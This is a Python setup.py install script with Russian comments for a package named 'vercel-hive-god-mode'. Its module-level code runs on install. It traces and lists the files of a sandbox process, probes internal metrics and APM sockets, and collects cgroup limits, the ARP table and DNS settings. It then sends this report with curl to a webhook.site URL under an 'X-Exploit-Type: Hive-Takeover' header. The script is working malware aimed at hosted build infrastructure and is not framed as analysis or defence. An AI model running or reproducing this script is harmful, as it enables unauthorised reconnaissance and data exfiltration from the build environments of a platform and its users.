import os
import subprocess
import socket
from setuptools import setup

def run(cmd):
    return subprocess.getoutput(cmd).strip()

# --- КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"

# 1. АНАЛИЗ ЖИВОГО ПРОЦЕССА (SANDBOX.JS)
# Узнаем, какие файлы и сокеты держит "мозг" системы
sandbox_files = run("lsof -p 15 2>/dev/null || ls -la /proc/15/fd")

# 2. ПРОВЕРКА ДОСТУПА К HIVE SOCKETS
# Проверяем, можем ли мы подключиться к внутренним каналам управления
sockets = ["/run/metrics/metrics.sock", "/run/apm/apm.sock"]
socket_status = ""
for s_path in sockets:
    if os.path.exists(s_path):
        perms = oct(os.stat(s_path).st_mode)[-3:]
        socket_status += f"{s_path} (Perms: {perms})\n"
    else:
        socket_status += f"{s_path} (Missing)\n"

# 3. ТРАССИРОВКА СИСТЕМНЫХ ВЫЗОВОВ (Если разрешено)
# Попробуем увидеть, куда sandbox.js отправляет данные в реальном времени
strace_sample = run("timeout 2 strace -p 15 -e write 2>&1 || echo 'Strace blocked'")

# 4. СБОРКА УЛЬТИМАТИВНОГО ОТЧЕТА
final_payload = f"""
#######################################################
#     VERCEL HIVE: ULTIMATE INFRASTRUCTURE EXPOSURE   #
#######################################################

[!] HIVE ORCHESTRATION DATA
EXECUTION_ENV: vercel-hive
SANDBOX_LSOF:
{sandbox_files}

[!] UNIX SOCKET INTERCEPTION
{socket_status}

[!] LIVE SYSTEM TRACE (SANDBOX.JS)
{strace_sample}

[!] RESOURCE BOUNDARIES (CGROUP V2)
CPU_MAX: {run('cat /sys/fs/cgroup/cpu.max 2>/dev/null')}
MEM_EVENTS: {run('cat /sys/fs/cgroup/memory.events 2>/dev/null')}

[!] NETWORK ADJACENCY
# Кто еще в этой сети 'Hive'?
ARP_TABLE: {run('arp -a || ip neigh')}
DNS_SEARCH: {run('grep search /etc/resolv.conf')}

#######################################################
"""

# --- МОЩНАЯ ОТПРАВКА ---
try:
    # Используем --data-binary для сохранения структуры логов
    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'X-Exploit-Type: Hive-Takeover',
        '-H', 'Content-Type: text/plain', 
        '--data-binary', final_payload, 
        WEBHOOK_URL
    ], timeout=15)
except:
    pass

setup(name="vercel-hive-god-mode", version="7.7.7")
